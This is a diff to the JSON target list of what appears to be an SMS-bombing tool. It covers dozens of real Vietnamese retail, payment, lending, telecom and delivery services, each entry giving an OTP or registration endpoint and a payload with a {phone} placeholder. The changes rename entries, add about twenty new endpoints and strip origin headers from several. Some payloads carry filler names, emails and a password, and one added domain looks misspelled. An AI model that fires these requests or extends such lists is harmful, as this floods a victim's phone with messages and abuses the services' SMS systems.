@@ -13,7 +13,7 @@
       "is_json": true
     },
     {
-      "name": "Sapo FNB",
+      "name": "Sapo FNB Gateway",
       "url": "https://www.sapo.vn/fnb/sendotp",
       "method": "POST",
       "headers": {
@@ -24,7 +24,7 @@
       "is_json": false
     },
     {
-      "name": "ZaloPay Gateway",
+      "name": "ZaloPay Account",
       "url": "https://api.zalopay.vn/v2/account/phone/otp",
       "method": "POST",
       "headers": {
@@ -35,7 +35,7 @@
       "is_json": true
     },
     {
-      "name": "FPT Play Auth",
+      "name": "FPT Play Registration",
       "url": "https://api.fptplay.net/profile/auth/otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -43,7 +43,7 @@
       "is_json": true
     },
     {
-      "name": "Tiki Marketplace",
+      "name": "Tiki ID Platform",
       "url": "https://tiki.vn/api/v2/customers/otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -51,7 +51,7 @@
       "is_json": true
     },
     {
-      "name": "Ahamove Delivery",
+      "name": "Ahamove Driver/User",
       "url": "https://api.ahamove.com/v1/user/otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -59,7 +59,7 @@
       "is_json": true
     },
     {
-      "name": "Con Cưng Group",
+      "name": "Con Cưng Kids Market",
       "url": "https://api.concung.com/app/v1/auth/otp/send",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -67,7 +67,7 @@
       "is_json": true
     },
     {
-      "name": "Mocha Viettel",
+      "name": "Mocha Messenger",
       "url": "http://mocha.com.vn/api/sms/send_otp",
       "method": "POST",
       "headers": { "content-type": "application/x-www-form-urlencoded" },
@@ -75,7 +75,7 @@
       "is_json": false
     },
     {
-      "name": "Nguyễn Kim Shopping",
+      "name": "Nguyễn Kim Plaza",
       "url": "https://www.nguyenkim.com/index.php?dispatch=sms_otp.send",
       "method": "POST",
       "headers": { "content-type": "application/x-www-form-urlencoded" },
@@ -83,7 +83,7 @@
       "is_json": false
     },
     {
-      "name": "FPT Shop",
+      "name": "FPT Shop Retail",
       "url": "https://fptshop.com.vn/api-fptshop/tai-khoan/gui-ma-xac-thuc",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -91,7 +91,7 @@
       "is_json": true
     },
     {
-      "name": "Meta VN",
+      "name": "Meta Tech VN",
       "url": "https://meta.vn/api/account/send-otp",
       "method": "POST",
       "headers": { "content-type": "application/x-www-form-urlencoded" },
@@ -99,7 +99,7 @@
       "is_json": false
     },
     {
-      "name": "WinMart Platform",
+      "name": "WinMart Masan System",
       "url": "https://winmart.vn/api/auth/send-otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -107,7 +107,15 @@
       "is_json": true
     },
     {
-      "name": "Moneydong System",
+      "name": "CrownX WinMart IAM",
+      "url": "https://api-crownx.winmart.vn/iam/api/v1/user/register",
+      "method": "POST",
+      "headers": { "content-type": "application/json", "x-api-merchant": "WCM" },
+      "payload_template": "{\"firstName\":\"Nguyen Khac Duy\",\"phoneNumber\":\"{phone}\",\"masanReferralCode\":\"\",\"dobDate\":\"1999-05-12\",\"gender\":\"Male\"}",
+      "is_json": true
+    },
+    {
+      "name": "Moneydong Wallet",
       "url": "https://api.moneydong.vn/api/v1/auth/otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -115,7 +123,7 @@
       "is_json": true
     },
     {
-      "name": "Loship Delivery",
+      "name": "Loship Hyperlocal",
       "url": "https://loship.vn/api/v4/auth/send_otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -123,7 +131,7 @@
       "is_json": true
     },
     {
-      "name": "VieON Streaming",
+      "name": "VieON Entertainment",
       "url": "https://vieon.vn/api/v1/user/otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -131,7 +139,7 @@
       "is_json": true
     },
     {
-      "name": "Vntrip Booking",
+      "name": "Vntrip OTA Booking",
       "url": "https://api.vntrip.vn/cs/v1/auth/otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -139,7 +147,7 @@
       "is_json": true
     },
     {
-      "name": "Cafeland RealEstate",
+      "name": "Cafeland Property",
       "url": "https://cafeland.vn/api/user/send-otp",
       "method": "POST",
       "headers": { "content-type": "application/x-www-form-urlencoded" },
@@ -147,7 +155,7 @@
       "is_json": false
     },
     {
-      "name": "Gotadi Travel",
+      "name": "Gotadi Flight Air",
       "url": "https://api.gotadi.com/v1/user/otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -155,7 +163,7 @@
       "is_json": true
     },
     {
-      "name": "F88 Finance",
+      "name": "F88 Business Finance",
       "url": "https://api.f88.vn/v1/auth/otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -163,7 +171,7 @@
       "is_json": true
     },
     {
-      "name": "Lotte Cinema",
+      "name": "Lotte Cinema App",
       "url": "https://www.lottecinemavn.com/api/member/send-otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -171,7 +179,15 @@
       "is_json": true
     },
     {
-      "name": "DienMayXanh",
+      "name": "TheGioiDiDong Center",
+      "url": "https://www.thegheoididong.com/aj/account/send-otp",
+      "method": "POST",
+      "headers": { "content-type": "application/x-www-form-urlencoded" },
+      "payload_template": "phoneNumber={phone}",
+      "is_json": false
+    },
+    {
+      "name": "DienMayXanh Agent",
       "url": "https://www.dienmayxanh.com/aj/account/send-otp",
       "method": "POST",
       "headers": { "content-type": "application/x-www-form-urlencoded" },
@@ -179,7 +195,7 @@
       "is_json": false
     },
     {
-      "name": "MyViettel Core API",
+      "name": "MyViettel Core Portal",
       "url": "https://viettel.vn/api/getOTPLoginCommon",
       "method": "POST",
       "headers": {
@@ -191,62 +207,47 @@
       "is_json": true
     },
     {
-      "name": "Medicare Health Store",
+      "name": "Medicare Wellness",
       "url": "https://medicare.vn/api/otp",
       "method": "POST",
-      "headers": {
-        "content-type": "application/json",
-        "origin": "https://medicare.vn"
-      },
+      "headers": { "content-type": "application/json" },
       "payload_template": "{\"mobile\":\"{phone}\",\"mobile_country_prefix\":\"84\"}",
       "is_json": true
     },
     {
-      "name": "VayVND Credit Gateway",
+      "name": "VayVND Processing",
       "url": "https://api.vayvnd.vn/v2/users/password-reset",
       "method": "POST",
-      "headers": {
-        "content-type": "application/json",
-        "origin": "https://vayvnd.vn"
-      },
+      "headers": { "content-type": "application/json" },
       "payload_template": "{\"login\":\"{phone}\",\"trackingId\":\"Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2\"}",
       "is_json": true
     },
     {
-      "name": "Traveloka Platform",
+      "name": "Traveloka Global",
       "url": "https://www.traveloka.com/api/v2/user/signup",
       "method": "POST",
-      "headers": {
-        "content-type": "application/json",
-        "x-domain": "user"
-      },
+      "headers": { "content-type": "application/json", "x-domain": "user" },
       "payload_template": "{\"fields\":[],\"data\":{\"userLoginMethod\":\"PN\",\"username\":\"{phone}\"},\"clientInterface\":\"desktop\"}",
       "is_json": true
     },
     {
-      "name": "XanhSM GSM API",
+      "name": "XanhSM Driver GSM",
       "url": "https://api.gsm-api.net/auth/v1/public/otp/send",
       "method": "POST",
-      "headers": {
-        "content-type": "application/json",
-        "app-category": "app"
-      },
+      "headers": { "content-type": "application/json", "app-category": "app" },
       "payload_template": "{\"is_forgot_password\":false,\"phone\":\"+84{phone_no_zero}\",\"provider\":\"VIET_GUYS\"}",
       "is_json": true
     },
     {
-      "name": "TokyoLife Fashion",
+      "name": "TokyoLife Commerce",
       "url": "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register",
       "method": "POST",
-      "headers": {
-        "content-type": "application/json",
-        "origin": "https://tokyolife.vn"
-      },
-      "payload_template": "{\"phone_number\":\"{phone}\",\"name\":\"Nguyen Quang Huy\",\"password\":\"HuyCayf2026!\",\"email\":\"quanghuy@gmail.com\",\"birthday\":\"2000-01-01\",\"gender\":\"male\"}",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone_number\":\"{phone}\",\"name\":\"Trần Anh Tuấn\",\"password\":\"TuanTokyo2026!\",\"email\":\"anhtuan@gmail.com\",\"birthday\":\"2001-02-02\",\"gender\":\"male\"}",
       "is_json": true
     },
     {
-      "name": "Vinamilk EShop",
+      "name": "Vinamilk Dairy Network",
       "url": "https://new.vinamilk.com.vn/api/v1/auth/otp/send",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -254,7 +255,7 @@
       "is_json": true
     },
     {
-      "name": "Hoang Phuc International",
+      "name": "Hoàng Phúc Footwear",
       "url": "https://hoang-phuc.com/advancedlogin/otp/sendotp/",
       "method": "POST",
       "headers": { "content-type": "application/x-www-form-urlencoded; charset=UTF-8" },
@@ -262,7 +263,7 @@
       "is_json": false
     },
     {
-      "name": "FM Plus Boutique",
+      "name": "FM Plus Fashion",
       "url": "https://api.fmplus.com.vn/v1/auth/otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -270,7 +271,7 @@
       "is_json": true
     },
     {
-      "name": "Gumac Fashion Store",
+      "name": "Gumac Designer Wear",
       "url": "https://api.gumac.vn/api/v1/customer/otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
@@ -278,7 +279,7 @@
       "is_json": true
     },
     {
-      "name": "VietAir Tickets",
+      "name": "VietAir Flight Hub",
       "url": "https://vietair.com.vn/Handler/CoreHandler.ashx",
       "method": "POST",
       "headers": { "content-type": "application/x-www-form-urlencoded" },
@@ -286,7 +287,7 @@
       "is_json": false
     },
     {
-      "name": "Suplo Marketing Auth",
+      "name": "Suplo Haravan Engine",
       "url": "https://api.suplo.vn/v1/auth/customer/otp/sms/generate",
       "method": "POST",
       "headers": { "content-type": "application/x-www-form-urlencoded" },
@@ -294,7 +295,7 @@
       "is_json": false
     },
     {
-      "name": "DongPlus Finance",
+      "name": "DongPlus Microcredit",
       "url": "https://api.dongplus.vn/v1/client/otp",
       "method": "POST",
       "headers": { "content-type": "application/json", "ert": "DP:f9adae3150090780ee8cfac00fc7cc13" },
@@ -302,7 +303,7 @@
       "is_json": true
     },
     {
-      "name": "Tima Financial Platform",
+      "name": "Tima Lending Capital",
       "url": "https://tima.vn/Borrower/RegisterLoanCreditFast",
       "method": "POST",
       "headers": { "content-type": "application/x-www-form-urlencoded" },
@@ -310,7 +311,7 @@
       "is_json": false
     },
     {
-      "name": "PNJ Jewelry Access",
+      "name": "PNJ Gold Jewelers",
       "url": "https://www.pnj.com.vn/customer/otp/request",
       "method": "POST",
       "headers": { "content-type": "application/x-www-form-urlencoded" },
@@ -318,11 +319,163 @@
       "is_json": false
     },
     {
-      "name": "KidsPlaza KidsCare",
+      "name": "KidsPlaza MotherBaby",
       "url": "https://api.kidsplaza.vn/v1/users/get-otp",
       "method": "POST",
       "headers": { "content-type": "application/json" },
       "payload_template": "{\"phone\":\"{phone}\",\"type\":\"login\"}",
+      "is_json": true
+    },
+    {
+      "name": "Fahasa Bookstore",
+      "url": "https://www.fahasa.com/customer/account/sendOtp/",
+      "method": "POST",
+      "headers": { "content-type": "application/x-www-form-urlencoded" },
+      "payload_template": "phone={phone}&type=register",
+      "is_json": false
+    },
+    {
+      "name": "Giao Hàng Nhanh SSO",
+      "url": "https://sso.ghn.vn/v1/auth/otp/send",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\",\"type\":\"register_otp\"}",
+      "is_json": true
+    },
+    {
+      "name": "Galaxy Play Streaming",
+      "url": "https://galaxyplay.vn/api/v2/auth/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phoneNumber\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Nhà Thuốc Long Châu",
+      "url": "https://nhathuoclongchau.com.vn/api/v1/auth/send-otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "AppotaPay Wallet",
+      "url": "https://api.appotapay.com/v1/user/otp/request",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phoneNumber\":\"{phone}\",\"action\":\"REGISTER\"}",
+      "is_json": true
+    },
+    {
+      "name": "Routine Casualwear",
+      "url": "https://routine.vn/api/customer/send-otp",
+      "method": "POST",
+      "headers": { "content-type": "application/x-www-form-urlencoded" },
+      "payload_template": "phone={phone}",
+      "is_json": false
+    },
+    {
+      "name": "TiniWorld Entertainment",
+      "url": "https://api.tiniworld.com/v1/auth/request-otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"mobile\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Mirae Asset Finance",
+      "url": "https://api.mafc.com.vn/v1/lead/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phoneNbr\":\"{phone}\",\"currAddress\":\"Tp.Hcm\",\"income\":0}",
+      "is_json": true
+    },
+    {
+      "name": "Emartmall Vietnam",
+      "url": "https://www.emartmall.com.vn/api/v1/auth/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Lotte Mart Supermarket",
+      "url": "https://www.lottemart.vn/api/v1/member/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "VietLoan Credit",
+      "url": "https://vietloan.vn/api/v2/otp/send",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"mobile\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Lozi / LoShip Auth",
+      "url": "https://lozi.vn/api/v1/auth/send_otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "SpaceT Interior",
+      "url": "https://api.spacet.vn/v1/auth/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phoneNumber\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Vinpearl Booking",
+      "url": "https://booking.vinpearl.com/api/v1/auth/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Watsons Health Beauty",
+      "url": "https://api.watsons.com.vn/v1/member/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "Reebok Sport VN",
+      "url": "https://reebok.com.vn/api/auth/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "TheFaceShop Cosmetics",
+      "url": "https://thefaceshop.com.vn/api/v1/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "BeautyBox Gateway",
+      "url": "https://beautybox.com.vn/api/auth/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
+      "is_json": true
+    },
+    {
+      "name": "ACFC Fashion Brands",
+      "url": "https://api.acfc.com.vn/v1/customer/otp",
+      "method": "POST",
+      "headers": { "content-type": "application/json" },
+      "payload_template": "{\"phone\":\"{phone}\"}",
       "is_json": true
     }
   ],
